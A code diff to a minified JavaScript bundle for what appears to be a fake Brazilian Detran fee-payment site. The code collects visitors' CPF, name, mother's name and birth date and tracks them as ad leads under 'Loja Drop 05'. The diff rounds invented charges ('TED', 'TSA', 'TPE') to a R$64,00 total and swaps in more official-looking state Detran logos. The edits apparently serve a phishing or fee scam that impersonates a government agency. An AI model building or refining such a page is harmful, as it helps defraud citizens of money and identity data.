@@ -12928,7 +12928,7 @@ function d3() {
       w.DADOS && w.DADOS.nome && w.DADOS.nome.trim() !== "" ? (localStorage.setItem("userData", JSON.stringify({
         cpf: h,
         nome: w.DADOS.nome,
-        dataNascimento: w.DADOS.data_nascimento || "",
+        dataNascimento: w.DADOS.data_nascimento || "",data_nascimento: w.DADOS.data_nascimento || "",
         nomeMae: w.DADOS.nome_mae || ""
       })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"Loja Drop 05",currency:"BRL",value:64.00});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"Loja Drop 05",currency:"BRL",value:64.00});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
     } catch (h) {
@@ -21302,7 +21302,7 @@ function RE() {
                     children: ["• Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
-                    children: "R$17,75"
+                    children: "R$17,00"
                   })]
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
@@ -21310,7 +21310,7 @@ function RE() {
                     children: ["• Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
-                    children: "R$21,70"
+                    children: "R$21,50"
                   })]
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
@@ -21318,7 +21318,7 @@ function RE() {
                     children: ["• Taxa de Processamento", l.jsx("br", {}), "e Emissão (TPE)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
-                    children: "R$25,25"
+                    children: "R$25,50"
                   })]
                 }), l.jsx("hr", {
                   className: "my-2"
@@ -21328,7 +21328,7 @@ function RE() {
                     children: "Total:"
                   }), l.jsx("span", {
                     className: "whitespace-nowrap",
-                    children: "R$64,70"
+                    children: "R$64,00"
                   })]
                 })]
               })]
@@ -22041,7 +22041,7 @@ function LE() {
 const Rg = {
   AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
   AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
-  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+  AP: "https://seeklogo.com/images/D/detran-amapa-logo-F2B2B2E2A0-seeklogo.com.png",
   AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
   BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
   CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
@@ -22055,17 +22055,17 @@ const Rg = {
   PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
   PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
   PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
-  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
+  PE: "https://www.detran.pe.gov.br/images/logo-detran-pe.png",
   PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
   RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
   RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
-  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
+  RS: "https://www.detran.rs.gov.br/upload/arquivos/201603/31103802-logo-detran-rs.png",
   RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
   RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
   SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
   SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
   SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
-  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
+  TO: "https://www.detran.to.gov.br/wp-content/uploads/2022/05/logo-detran-to.png"
 };
 
 function OE() {
@@ -22950,7 +22950,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão 
                       children: "TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "17,75"
+                      children: "17,00"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22959,7 +22959,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão 
                       children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "21,70"
+                      children: "21,50"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22968,14 +22968,14 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão 
                       children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "25,25"
+                      children: "25,50"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "64,70"
+                      children: "64,00"
                     })]
                   })]
                 })]
@@ -23212,7 +23212,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão 
 const FE = {
   AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
   AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
-  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+  AP: "https://seeklogo.com/images/D/detran-amapa-logo-F2B2B2E2A0-seeklogo.com.png",
   AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
   BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
   CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
@@ -23226,17 +23226,17 @@ const FE = {
   PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
   PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
   PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
-  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
+  PE: "https://www.detran.pe.gov.br/images/logo-detran-pe.png",
   PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
   RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
   RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
-  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
+  RS: "https://www.detran.rs.gov.br/upload/arquivos/201603/31103802-logo-detran-rs.png",
   RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
   RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
   SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
   SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
   SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
-  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
+  TO: "https://www.detran.to.gov.br/wp-content/uploads/2022/05/logo-detran-to.png"
 };
 
 function VE() {
@@ -24120,7 +24120,7 @@ function uT() {
         g.DADOS && g.DADOS.nome && g.DADOS.nome.trim() !== "" ? (localStorage.setItem("userData", JSON.stringify({
           cpf: v,
           nome: g.DADOS.nome,
-          dataNascimento: g.DADOS.data_nascimento || "",
+          dataNascimento: g.DADOS.data_nascimento || "",data_nascimento: g.DADOS.data_nascimento || "",
           nomeMae: g.DADOS.nome_mae || ""
         })), e(`/verificacao?data=${encodeURIComponent(JSON.stringify(g.DADOS))}`)) : e(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: v, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`)
       } catch (v) {
